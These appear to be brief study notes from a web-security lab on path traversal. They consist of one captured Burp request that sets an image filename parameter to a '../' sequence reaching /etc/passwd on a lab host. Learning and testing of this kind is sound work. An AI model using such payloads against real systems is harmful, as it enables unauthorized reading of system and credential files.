
`../../` thingy
also `..\..\..\` on windows

we can capture a request in burp and change the filename, ex:
```http
GET /image?filename=../../../../../../../etc/passwd HTTP/2
Host: 0a0c00910333b1fd84bdc457008e009f.web-security-academy.net
Cookie: session=DlkuFbm92oQoTwBEUo4GW851TweHmoy5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0c00910333b1fd84bdc457008e009f.web-security-academy.net/product?productId=15
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Te: trailers


```

